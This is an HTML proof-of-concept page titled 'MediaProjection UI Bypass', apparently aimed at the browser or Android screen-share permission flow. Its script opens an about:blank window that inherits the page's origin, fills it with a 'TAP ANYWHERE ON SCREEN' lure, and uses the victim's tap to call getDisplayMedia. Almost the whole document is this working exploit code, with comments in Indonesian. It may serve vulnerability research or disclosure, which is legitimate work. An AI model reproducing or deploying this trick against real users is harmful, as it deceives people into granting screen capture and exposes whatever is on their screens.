<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
  .btn { background: #34a853; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 80%; }
</style>
</head>
<body>
  <h2>MediaProjection UI Bypass</h2>
  <p style="color: #9aa0a6;">Target: Screen Share API</p>
  
  <button class="btn" id="trigger">Start Screen Share</button>

<script>
document.getElementById('trigger').addEventListener('click', () => {
    // 1. Buka about:blank buat ngewarisin origin "ologoligature.github.io"
    let victimWin = window.open('about:blank');
    
    // 2. Kasih instruksi di tab baru
    setTimeout(() => {
        victimWin.document.body.innerHTML = `
            <body style="background:#202124; color:white; text-align:center; padding-top:40vh; font-family:sans-serif;">
                <h3 style="color:#34a853;">👆 TAP ANYWHERE ON SCREEN 👆</h3>
            </body>
        `;
        
        // 3. Eksekusi Screen Share (Harus di-trigger pake klik di dalam about:blank)
        victimWin.addEventListener('click', async () => {
            try {
                // Manggil UI MediaProjection bawaan OS Android
                await victimWin.navigator.mediaDevices.getDisplayMedia({video: true});
            } catch (err) {
                console.log('User cancelled or error: ', err);
            }
        });
    }, 150);
});
</script>
</body>
</html>
